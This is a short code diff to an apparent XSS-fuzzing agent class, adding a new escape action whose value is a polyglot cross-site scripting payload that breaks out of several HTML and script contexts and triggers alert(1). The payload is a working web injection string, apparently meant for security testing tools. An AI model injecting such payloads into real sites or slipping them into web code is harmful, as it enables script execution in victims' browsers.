@@ -12,7 +12,8 @@ class EscapeAgent:
             "backtick",           # `
             "parenthesis",        # ( )
             "curly_brace",        # { }
-            "square_bracket"      # [ ]
+            "square_bracket",     # [ ]
+            "polyglot_html_attr_js" # Polyglot context escape
         ]
         self.mapping = {
             "angle_bracket": "><",
@@ -21,7 +22,8 @@ class EscapeAgent:
             "backtick": "`",
             "parenthesis": "()",
             "curly_brace": "{}",
-            "square_bracket": "[]"
+            "square_bracket": "[]",
+            "polyglot_html_attr_js": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/(/*  */ alert(1) )//'>"
         }
 
     def act(self, action_name=None):
